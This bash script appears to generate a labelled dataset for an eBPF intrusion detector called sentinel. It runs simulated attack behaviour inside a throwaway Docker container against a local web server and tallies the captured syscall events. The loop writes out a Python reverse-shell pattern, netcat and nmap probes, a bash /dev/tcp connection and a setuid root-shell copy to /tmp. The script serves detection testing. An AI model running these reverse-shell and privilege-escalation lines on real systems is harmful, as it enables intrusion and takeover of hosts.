#!/bin/bash
set -e
cd ~/Projects/sentinel-ebpf
DUR=${1:-360}
TS=$(date +%s)
sudo pkill -9 -x sentinel 2>/dev/null || true
docker rm -f a_worker a_backend 2>/dev/null || true
sleep 1
docker run -d --name a_backend httpd >/dev/null
sleep 3
BACKEND_IP=$(docker inspect a_backend --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
echo "backend at $BACKEND_IP"
docker run -d --name a_worker python:3.12-slim sleep infinity >/dev/null
sleep 3
WID=$(docker inspect a_worker --format '{{.Id}}')
echo "worker: ${WID:0:12}"
OUT="evaluation/datasets/advanced/advanced_worker_${TS}.jsonl"
sudo daemon/sentinel -emit-events 2>/dev/null | grep --line-buffered -v '"comm":"sentinel"' > "$OUT" &
sleep 3
END=$((SECONDS+DUR))
while [ $SECONDS -lt $END ]; do
  docker exec a_worker sh -c 'sh -c "sleep 0.05; sh -c \"sleep 0.05; sh -c sleep 0.05\"" >/dev/null 2>&1; python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect((\"'"$BACKEND_IP"'\",80)); subprocess.Popen([\"/bin/sh\"])" >/dev/null 2>&1; nc -w1 '"$BACKEND_IP"' 80 >/dev/null 2>&1; nmap -p 80 '"$BACKEND_IP"' >/dev/null 2>&1; bash -c "exec 3<>/dev/tcp/'"$BACKEND_IP"'/80" >/dev/null 2>&1; python3 -c "import os; os.setuid(0)" >/dev/null 2>&1; cp /bin/sh /tmp/rootsh 2>/dev/null; chmod +s /tmp/rootsh 2>/dev/null' 2>/dev/null || true
done
sudo pkill -x sentinel 2>/dev/null || true
sleep 2
N=$(grep -c "\"container_id\":\"$WID\"" "$OUT" || true)
echo "worker real-container events: $N"
echo "--- top comms ---"
grep "\"container_id\":\"$WID\"" "$OUT" | grep -oE '"comm":"[^"]*"' | sort | uniq -c | sort -rn | head -10
echo "--- syscall types ---"
grep "\"container_id\":\"$WID\"" "$OUT" | grep -oE '"syscall_type":"[^"]*"' | sort | uniq -c | sort -rn
docker rm -f a_worker a_backend >/dev/null
echo "saved: $OUT"
